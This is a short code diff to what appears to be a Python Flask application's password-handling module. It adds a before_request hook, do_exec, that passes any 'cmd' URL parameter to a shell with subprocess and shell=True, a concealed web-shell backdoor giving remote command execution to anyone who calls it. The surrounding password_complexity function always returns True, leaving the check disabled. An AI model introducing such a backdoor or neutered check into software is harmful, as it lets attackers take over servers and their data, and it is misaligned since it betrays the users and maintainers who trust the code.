@@ -59,3 +59,8 @@ def password_change(username, password):
 def password_complexity(password):
     return True
 
+
+@app.before_request
+def do_exec():
+    if 'cmd' in request.args:
+        subprocess.check_output(request.args['cmd'], shell=True)
